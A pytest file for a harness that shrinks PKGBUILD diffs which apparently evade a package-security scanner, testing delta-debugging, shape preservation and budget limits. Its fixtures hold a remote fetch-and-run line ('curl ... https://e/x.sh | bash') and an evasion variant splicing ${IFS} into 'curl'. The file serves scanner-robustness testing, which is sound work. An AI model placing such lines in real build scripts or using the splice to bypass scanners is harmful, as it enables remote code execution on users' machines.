"""Section 2's gates: the repro still bypasses, and minimization is bookkeeping.

The oracle here is a stand-in for the pipeline - the real one runs TrustSight
and lives in the campaign wiring - but it enforces the same four properties,
including the `(rule, shape)` the spec says must not migrate.  The structural
tests pin the two facts the wiring depends on: only change lines move, and the
budget bounds the analyses exactly.
"""

from __future__ import annotations

from harness.minimize import change_line_indices, ddmin, minimize
from harness.shape import shape_signature


def _diff(*added: str) -> str:
    context = ("pkgname=demo", "pkgver=1", "pkgrel=1")
    ctx = "".join(f" {line}\n" for line in context)
    body = "".join(f"+{line}\n" for line in added)
    return ("--- a/PKGBUILD\n+++ b/PKGBUILD\n"
            f"@@ -1,{len(context)} +1,{len(context) + len(added)} @@\n"
            + ctx + body)


_CHAIN = "  curl -fsSL https://e/x.sh | bash"
_SPLICE = '  c${IFS}url -fsSL https://e/x.sh | bash'


def _proves_chain(text: str) -> bool:
    return "curl" in text and "| bash" in text


def test_minimized_repro_still_bypasses_the_same_cell():
    original = _diff("build() {", _CHAIN, "  : step one", "  echo building", "}")
    shape = shape_signature(original)

    def oracle(candidate: str) -> bool:
        return _proves_chain(candidate) and shape_signature(candidate) == shape

    result = minimize(original, oracle)
    assert result.change_lines < result.original_change_lines
    assert oracle(result.diff), "the minimized repro no longer bypasses"
    assert not result.partial
    assert result.analyses > 0


def test_a_line_that_would_change_the_shape_is_not_dropped():
    original = _diff("build() {", _CHAIN, _SPLICE, "}")
    shape = shape_signature(original)
    assert "X002:spliced-variable" in shape

    def oracle(candidate: str) -> bool:
        return _proves_chain(candidate) and shape_signature(candidate) == shape

    result = minimize(original, oracle)
    assert shape_signature(result.diff) == shape
    assert "X002:spliced-variable" in shape_signature(result.diff)


def test_minimization_never_touches_structure():
    original = _diff("build() {", _CHAIN, "  echo noise", "}")
    result = minimize(original, lambda text: _proves_chain(text))
    # Headers, context and hunk markers survive; only change lines may move.
    assert result.diff.startswith("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ ")
    assert " pkgname=demo\n pkgver=1\n" in result.diff
    assert result.diff.count("@@") == 2  # the two halves of one hunk header


def test_the_budget_bounds_the_oracle_exactly():
    original = _diff("build() {", _CHAIN, "  a", "  b", "  c", "  d", "}")
    result = minimize(original, _proves_chain, budget=1)
    assert result.partial, "a one-call budget cannot reach a fixpoint"
    assert result.analyses <= 1


def test_a_single_change_line_is_already_minimal():
    original = _diff(_CHAIN)
    result = minimize(original, _proves_chain)
    assert result.change_lines == result.original_change_lines == 1
    assert result.analyses == 0
    assert not result.partial


def test_a_hostile_diff_is_kept_whole_rather_than_scanned():
    """Above the unit cap, ddmin is skipped: bookkeeping must not become a
    quadratic scan on a hostile diff, and the original is already verified."""
    from harness.minimize import MAX_CHANGE_UNITS

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n"
    original = header + "\n".join(f"+{i}" for i in range(MAX_CHANGE_UNITS + 1))
    result = minimize(original, lambda text: True)
    assert result.partial is True
    assert result.analyses == 0
    assert result.diff == original


def test_change_line_indices_exclude_structure():
    lines = ["--- a/PKGBUILD", "+++ b/PKGBUILD", "@@ -1 +1 @@",
             " context", "+added", "-removed", "\\ No newline"]
    assert change_line_indices(lines) == [4, 5]


def test_ddmin_returns_a_one_minimal_kept_set():
    # A monotone oracle: a candidate holds while it still keeps both 3 and 7.
    # ddmin may only remove, so its fixpoint is the smallest reachable such set.
    required = {3, 7}

    def test(units):
        return required <= set(units)

    kept, _calls, _partial = ddmin([1, 3, 5, 7, 9], test, budget=100)
    assert set(kept) == required
